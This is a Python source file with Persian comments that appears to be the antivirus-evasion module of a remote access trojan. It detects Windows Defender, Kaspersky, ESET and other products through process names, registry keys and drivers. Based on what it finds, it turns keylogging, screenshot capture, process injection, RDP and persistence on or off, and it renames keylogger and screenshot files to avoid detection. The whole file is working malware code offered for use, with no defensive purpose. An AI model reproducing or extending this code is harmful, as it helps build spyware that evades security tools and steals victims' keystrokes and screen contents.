import psutil
import winreg
import subprocess
import logging
import platform
import os  # Added import for os
import uuid  # Added import for uuid
from typing import List, Dict
from rat_config import Config

class AntiAV:
    """ماژول برای تشخیص و مدیریت آنتی‌ویروس‌ها"""

    # لیست آنتی‌ویروس‌های شناخته‌شده و فرآیندهای مرتبط
    KNOWN_ANTIVIRUSES = {
        "Windows Defender": ["MsMpEng.exe", "smartscreen.exe"],
        "Kaspersky": ["avp.exe", "avpui.exe"],
        "ESET": ["egui.exe", "ekrn.exe"],
        "Avast": ["avastsvc.exe", "avastui.exe"],
        "Norton": ["ns.exe", "nortonsecurity.exe"],
        "McAfee": ["mfevtps.exe", "mcshield.exe"],
        "Bitdefender": ["bdagent.exe", "bdservicehost.exe"]
    }

    def __init__(self):
        if Config.DEBUG_MODE:
            logging.info("AntiAV initialized")

    def detect_antivirus(self) -> List[Dict]:
        """
        شناسایی آنتی‌ویروس‌های فعال با استفاده از فرآیندها، رجیستری، و درایورها
        """
        if platform.system().lower() != "windows":
            if Config.DEBUG_MODE:
                logging.info("Antivirus detection only supported on Windows")
            return [{"name": "Unknown", "status": "not_supported"}]

        detected_avs = []
        try:
            # بررسی فرآیندها
            for av_name, processes in self.KNOWN_ANTIVIRUSES.items():
                for proc in psutil.process_iter(['name']):
                    if proc.info['name'].lower() in [p.lower() for p in processes]:
                        detected_avs.append({
                            "name": av_name,
                            "process": proc.info['name'],
                            "status": "active",
                            "method": "process"
                        })
                        if Config.DEBUG_MODE:
                            logging.info(f"Detected {av_name} via process: {proc.info['name']}")

            # بررسی رجیستری
            registry_paths = {
                "Windows Defender": r"SOFTWARE\Microsoft\Windows Defender",
                "Kaspersky": r"SOFTWARE\KasperskyLab",
                "ESET": r"SOFTWARE\ESET",
                "Avast": r"SOFTWARE\AVAST Software",
                "Norton": r"SOFTWARE\Norton",
                "McAfee": r"SOFTWARE\McAfee",
                "Bitdefender": r"SOFTWARE\Bitdefender"
            }
            for av_name, reg_path in registry_paths.items():
                try:
                    winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path)
                    if not any(av["name"] == av_name for av in detected_avs):
                        detected_avs.append({
                            "name": av_name,
                            "status": "installed",
                            "method": "registry"
                        })
                        if Config.DEBUG_MODE:
                            logging.info(f"Detected {av_name} via registry: {reg_path}")
                except FileNotFoundError:
                    continue
                except Exception as e:
                    if Config.DEBUG_MODE:
                        logging.error(f"Registry check error for {av_name}: {str(e)}")

            # بررسی درایورها
            try:
                driver_info = subprocess.check_output("driverquery", shell=True).decode().lower()
                driver_indicators = {
                    "Kaspersky": ["klif.sys", "kl1.sys"],
                    "ESET": ["eamonm.sys", "ehdrv.sys"],
                    "Avast": ["aswsp.sys", "aswmonflt.sys"],
                    "Norton": ["symefasi.sys", "srtsp.sys"],
                    "McAfee": ["mfencbdc.sys", "mfehidk.sys"],
                    "Bitdefender": ["trufos.sys", "gzflt.sys"]
                }
                for av_name, drivers in driver_indicators.items():
                    if any(driver in driver_info for driver in drivers):
                        if not any(av["name"] == av_name for av in detected_avs):
                            detected_avs.append({
                                "name": av_name,
                                "status": "active",
                                "method": "driver"
                            })
                            if Config.DEBUG_MODE:
                                logging.info(f"Detected {av_name} via driver")
            except Exception as e:
                if Config.DEBUG_MODE:
                    logging.error(f"Driver check error: {str(e)}")

            if not detected_avs:
                detected_avs.append({"name": "None", "status": "no_antivirus", "method": "none"})
                if Config.DEBUG_MODE:
                    logging.info("No antivirus detected")

            return detected_avs

        except Exception as e:
            if Config.DEBUG_MODE:
                logging.error(f"Antivirus detection error: {str(e)}")
            return [{"name": "Error", "status": "error", "method": "none", "error": str(e)}]

    def adjust_behavior(self, antivirus: Dict) -> Dict:
        """
        تنظیم رفتار ابزار بر اساس آنتی‌ویروس شناسایی‌شده
        """
        try:
            av_name = antivirus.get("name", "Unknown")
            behavior = {
                "screenshot_enabled": True,
                "keylogging_enabled": True,
                "process_injection_enabled": True,
                "rdp_enabled": True,
                "persistence_enabled": True
            }

            if av_name == "Windows Defender":
                # Windows Defender حساس به تزریق فرآیند است
                behavior["process_injection_enabled"] = False
                if Config.DEBUG_MODE:
                    logging.info("Disabled process injection due to Windows Defender")
            elif av_name == "Kaspersky":
                # Kaspersky اسکرین‌شات‌ها را ممکن است بلاک کند
                behavior["screenshot_enabled"] = False
                if Config.DEBUG_MODE:
                    logging.info("Disabled screenshot capture due to Kaspersky")
            elif av_name == "ESET":
                # ESET به کیلاگینگ حساس است
                behavior["keylogging_enabled"] = False
                if Config.DEBUG_MODE:
                    logging.info("Disabled keylogging due to ESET")
            elif av_name == "Avast":
                # Avast ممکن است RDP را مشکوک تشخیص دهد
                behavior["rdp_enabled"] = False
                if Config.DEBUG_MODE:
                    logging.info("Disabled RDP due to Avast")
            elif av_name in ["Norton", "McAfee", "Bitdefender"]:
                # این آنتی‌ویروس‌ها به پایداری حساس‌اند
                behavior["persistence_enabled"] = False
                if Config.DEBUG_MODE:
                    logging.info(f"Disabled persistence due to {av_name}")

            return behavior

        except Exception as e:
            if Config.DEBUG_MODE:
                logging.error(f"Behavior adjustment error: {str(e)}")
            return {
                "screenshot_enabled": True,
                "keylogging_enabled": True,
                "process_injection_enabled": True,
                "rdp_enabled": True,
                "persistence_enabled": True,
                "error": str(e)
            }

    def obfuscate_code(self):
        """
        اعمال مبهم‌سازی ساده روی کد برای کاهش تشخیص آنتی‌ویروس
        (اینجا فقط یک نمونه ساده است؛ برای مبهم‌سازی واقعی از pyarmor یا Cython استفاده کنید)
        """
        try:
            if Config.DEBUG_MODE:
                logging.info("Applying code obfuscation")
            # نمونه ساده: تغییر نام فایل‌های موقت
            temp_files = ["keylogger.log", "screenshot.png"]
            for file in temp_files:
                if os.path.exists(file):
                    new_name = f"temp_{uuid.uuid4().hex[:8]}.tmp"
                    os.rename(file, new_name)
                    if Config.DEBUG_MODE:
                        logging.info(f"Renamed {file} to {new_name}")
            return True
        except Exception as e:
            if Config.DEBUG_MODE:
                logging.error(f"Code obfuscation error: {str(e)}")
            return False